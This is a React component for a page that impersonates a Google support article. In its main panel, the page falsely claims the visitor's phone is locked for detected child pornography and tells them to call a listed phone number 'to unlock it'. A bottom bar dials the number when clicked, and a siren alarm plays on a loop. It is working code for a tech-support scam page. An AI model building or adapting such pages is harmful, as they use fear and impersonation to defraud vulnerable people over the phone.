const OldHome = () => {


return (
    <>
    
    <div className="flex flex-col w-full min-h-screen p-4 md:p-10 pb-20">
        <header className="flex justify-between items-center w-full max-w-6xl mx-auto border-b border-[#e2e8f0] shadow-sm p-4">
          <div className="flex items-center gap-4">
            <button className="md:hidden">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="lucide lucide-menu"
              >
                <line x1="4" x2="20" y1="12" y2="12"></line>
                <line x1="4" x2="20" y1="6" y2="6"></line>
                <line x1="4" x2="20" y1="18" y2="18"></line>
              </svg>
            </button>
            <img src="/google-logo.png" alt="Google" className="h-6"></img>
          </div>
          <div className="flex items-center gap-6">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="lucide lucide-search text-gray-600"
            >
              <circle cx="11" cy="11" r="8"></circle>
              <path d="m21 21-4.3-4.3"></path>
            </svg>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="lucide lucide-user-plus text-gray-600"
            >
              <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
              <circle cx="9" cy="7" r="4"></circle>
              <line x1="19" x2="19" y1="8" y2="14"></line>
              <line x1="22" x2="16" y1="11" y2="11"></line>
            </svg>
          </div>
        </header>
        <nav className="flex items-center w-full max-w-6xl mx-auto mt-4">
          <button className="font-medium flex items-center gap-1 text-gray-800">
            Support
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="lucide lucide-chevron-down"
            >
              <path d="m6 9 6 6 6-6"></path>
            </svg>
          </button>
        </nav>
        <div className="w-full max-w-6xl mx-auto mt-4">
          <button className="flex items-center gap-2 border border-[#e2e8f0] p-2 rounded-md text-gray-700">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="20"
              height="20"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="lucide lucide-list"
            >
              <path d="M3 12h.01"></path>
              <path d="M3 18h.01"></path>
              <path d="M3 6h.01"></path>
              <path d="M8 12h13"></path>
              <path d="M8 18h13"></path>
              <path d="M8 6h13"></path>
            </svg>
            Related topics
          </button>
        </div>
        <main className="w-full max-w-4xl mt-8 space-y-6 text-center md:text-left mx-auto">
          <h1 className="text-2xl font-semibold text-gray-800">
            Running troubleshooters in Get Help
          </h1>
          <div className="bg-blue-50 border-l-4 border-blue-500 p-4">
            <h1 className="text-2xl md:text-3xl font-semibold tracking-tight">
              Account Locked
            </h1>
            <p className="text-base md:text-lg text-[#64748b]">
              Your Phone has been locked due to detected illegal Child
              pornography. Your Google Account has been disabled! Immediately
              call Google Support 1(833)-521-4338 to unlock it!. <br />
              <br />
            </p>
            <button className="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-10 mt-2 bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">
              Unlock now
            </button>
          </div>
          <div className="bg-gray-100 p-4 rounded">
            <p className="text-gray-800">
              The Google Support and Recovery Assistant has been replaced with
              troubleshooters integrated into Get Help.
            </p>
          </div>
          <p className="text-gray-700">
            Get Help has troubleshooters you can run for many common scenarios.
            These often help resolve issues without the need to contact support.
            If a troubleshooter is available for your issue, select Start to run
            that troubleshooter.
          </p>
        </main>
        <div
          className="fixed bottom-0 left-0 w-full bg-white shadow-md p-4 flex justify-center items-center border-t border-[#e2e8f0]"
          onClick={() => {
            window.location.href = `tel:+${PHONE_NUMBER}`; // 📞 Phone call trigger
          }}
        >
          <button
            className=" bg-black text-white inline-flex items-center justify-center gap-2 whitespace-nowrap 
          font-medium ring-offset-background transition-colors focus-visible:outline-none 
          disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0  hover:bg-gray-900 h-11 rounded-md px-8 w-full max-w-4xl text-lg"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="lucide lucide-phone-call mr-2  w-[1rem] h-[1rem]"
            >
              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
              <path d="M14.05 2a9 9 0 0 1 8 7.94"></path>
              <path d="M14.05 6A5 5 0 0 1 18 10"></path>
            </svg>
            Call {PHONE_NUMBER}
          </button>
        </div>

        {/* 🔊 Emergency Alert Sound */}
        <audio ref={audioRef} loop autoPlay>
          <source src="/siren-alert.mp3" type="audio/mpeg" />
        </audio>
      </div>
    </>
)
}